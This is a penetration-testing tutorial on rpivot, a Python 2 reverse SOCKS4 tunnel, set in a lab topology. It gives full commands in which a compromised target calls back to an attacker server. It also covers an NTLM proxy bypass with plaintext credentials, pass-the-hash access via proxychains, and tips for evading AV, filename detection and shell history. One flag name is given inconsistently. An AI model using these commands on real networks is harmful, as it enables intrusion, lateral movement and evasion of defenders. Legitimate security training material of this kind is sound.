Rpivot is a Python 2 reverse SOCKS4 tunnel designed for a specific and awkward scenario: you have code execution on a target that can make outbound HTTP connections, but direct inbound TCP to the target is firewalled, and you cannot deploy a binary agent like Chisel because only Python is available. In these environments, rpivot is often the correct tool.

The architecture is the inverse of a typical port forward. The server runs on the attacker and the client runs on the target. The target initiates an outbound HTTP connection to the attacker's server, which then exposes a SOCKS4 proxy locally on the attacker. Any tool that supports SOCKS4 (or proxychains configured with socks4) can then route traffic through the target's network.

It is worth understanding the specific conditions under which rpivot is appropriate before reaching for it. Its SOCKS4 tunnelling is less capable than SOCKS5 (no UDP, no authentication support), it requires Python 2 on both sides which is increasingly absent on modern systems, and the underlying HTTP transport is plaintext. However, in legacy Windows enterprise environments where Python 2 is already installed for operational tooling and direct TCP is blocked on egress, rpivot may be your only option.

### Why Rpivot?

Network environments that restrict outbound traffic to approved protocols typically permit HTTP (port 80) and HTTPS (port 443). An outbound HTTP connection from the target to the attacker's server on port 80 or 443 will pass through most basic firewalls. NTLM-authenticating HTTP proxies — common in enterprise environments — present an additional barrier that rpivot handles explicitly via dedicated command-line arguments.

The combination of HTTP transport, Python 2 compatibility, and NTLM proxy bypass support makes rpivot uniquely suited to heavily locked-down corporate environments where nothing else works.

### TL;DR

**Attacker**
```bash
python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

**Target**
```bash
python2 client.py --server-ip 192.168.1.10 --server-port 9999
```

**Attacker — proxychains config**
```
# /etc/proxychains.conf
socks4 127.0.0.1 1080
```

### Installation

Rpivot is not available via package managers. Clone it from GitHub on the attacker:

```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
```

Transfer `client.py` (and any library files rpivot requires) to the target. Unlike binary agents, this is a Python script and may evade tooling that scans for executable files.

> [!NOTE]
> Python 2 must be available on both the attacker and the target. On the attacker (Kali), Python 2 can be installed via `apt install python2`. On the target, check with `python2 --version` or `python --version`. In some environments, Python 2 may exist as `python` while Python 3 exists as `python3`.

### Lab Topology

| Host               | Primary IP    | Secondary IP  | Open Ports          | Role           |
| ------------------ | ------------- | ------------- | ------------------- | -------------- |
| Attacker (Kali)    | 192.168.1.10  | N/A           | 9999 (server)       | Attack Box     |
| Target (Windows)   | 192.168.1.13  | 10.10.30.201  | Outbound HTTP only  | Jump Host      |
| Internal Target    | 10.10.30.200  | N/A           | 80, 443, 445        | Internal Host  |
| NTLM Proxy         | 10.10.0.1     | N/A           | 8080                | Corporate Proxy|

The target can only make outbound HTTP connections. Inbound TCP from the attacker is blocked. The NTLM proxy at 10.10.0.1:8080 authenticates outbound HTTP.

### Basic Setup (No Proxy)

#### Step 1: Start the Server on the Attacker

```bash
cd rpivot
python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

- `--server-port 9999` — port the rpivot server listens on for incoming client connections
- `--server-ip 0.0.0.0` — accept connections on all interfaces
- `--proxy-ip 127.0.0.1` — bind the SOCKS4 proxy locally on the attacker
- `--proxy-port 1080` — port of the SOCKS4 proxy

The server will sit waiting for the client to connect.

#### Step 2: Run the Client on the Target

```bash
python2 client.py --server-ip 192.168.1.10 --server-port 9999
```

The client initiates an outbound HTTP connection to the attacker's server. Once connected, the server exposes the SOCKS4 proxy.

#### Step 3: Configure Proxychains

Edit `/etc/proxychains.conf` on the attacker:

```
[ProxyList]
socks4 127.0.0.1 1080
```

> [!NOTE]
> Rpivot uses SOCKS4, not SOCKS5. Use `socks4` in the proxychains config, not `socks5`. SOCKS4 does not support UDP or remote DNS resolution — `proxychains nmap` with UDP scan types will not work.

#### Step 4: Route Traffic Through the Tunnel

```bash
proxychains curl http://10.10.30.200
proxychains nmap -sT -Pn 10.10.30.0/24
proxychains evil-winrm -i 10.10.30.200 -u Administrator -H HASH
```

### NTLM Proxy Bypass

This is rpivot's standout feature. In corporate environments with a mandatory authenticating HTTP proxy, the client connects through the proxy by supplying NTLM credentials.

#### Run on the Target (with NTLM proxy)

```bash
python2 client.py --server-ip 192.168.1.10 --server-port 9999 --ntlm-proxy-ip 10.10.0.1 --ntlm-proxy-port 8080 --domain CORP --username jdoe --password Password1
```

The additional arguments:

- `--ntlm-proxy-ip` — IP address of the NTLM-authenticating HTTP proxy
- `--ntlm-proxy-port` — port of the proxy
- `--domain` — Windows domain for authentication
- `--username` — username to authenticate with
- `--password` — plaintext password

Rpivot performs NTLM authentication with the proxy and then tunnels the connection to the rpivot server through the authenticated proxy session. From the server side, the tunnel behaves identically to a direct connection.

> [!NOTE]
> Passing credentials in clear text on the command line is a security risk if the target is a shared system or the command history is logged. In PowerShell on Windows, consider setting the command in a script or clearing history after use. On Linux, prefix the command with a space to avoid bash history logging (requires `HISTCONTROL=ignorespace`).

### Operational Security Notes

Rpivot's HTTP transport is plaintext. All tunnelled data is unencrypted on the wire unless you route rpivot through an HTTPS-capable proxy or wrap the connection in TLS separately. On monitored links, a persistent HTTP connection from the target to an external IP is visible in proxy logs and firewall logs. The HTTP keep-alive mechanism that rpivot uses to maintain the tunnel will be visible as a long-lived HTTP session.

Python scripts are less likely to be caught by AV than compiled binaries, but modern EDR solutions perform behavioural analysis of Python interpreter activity and may flag unusual network connections from Python processes. Rename `client.py` to something benign if the environment performs filename-based detection.

### Troubleshooting

Server starts but client cannot connect: Verify that port 9999 on the attacker is reachable from the target. Test with `curl http://192.168.1.10:9999` from the target. If the environment requires HTTPS, consider tunnelling rpivot over a different transport.

NTLM authentication fails: Verify the domain, username, and password. Check that `--ntlm-proxy-ip` and `--ntlmProxyPort` match the actual proxy configuration. Some environments require the username in UPN format (user@domain.com) rather than DOMAIN\user.

Proxychains resolves names but connections fail: SOCKS4 does not support remote DNS resolution. If you need DNS-over-SOCKS, switch to SOCKS5 (SSH `-D` or Chisel) instead.

Python2 not found: Install with `apt install python2` (Kali/Debian) or check for `python2.7`. On Windows targets, Python 2 may be at `C:\Python27\python.exe`.

### Quick Reference

| Component | Command |
| --------- | ------- |
| Server    | `python2 server.py --server-port PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port SOCKS_PORT` |
| Client    | `python2 client.py --server-ip ATTACKER_IP --server-port PORT` |
| NTLM      | `... --ntlm-proxy-ip PROXY_IP --ntlm-proxy-port PROXY_PORT --domain DOM --username USER --password PASS` |
| Proxychains | `socks4 127.0.0.1 SOCKS_PORT` |

### When to Use Rpivot vs Alternatives

Use rpivot when: only outbound HTTP is allowed from the target, Python 2 is available, and you need the NTLM proxy bypass capability specifically.

Use SSH `-D` when: SSH is available and you want a SOCKS proxy without uploading anything beyond what's already on the system.

Use Chisel when: you need HTTP transport like rpivot but want SOCKS5 support, encryption, and a modern binary with Windows and Linux compatibility.

Use Ligolo-ng when: you can transfer a binary and want full native routing without the complexity of configuring per-service port forwards or SOCKS proxies.
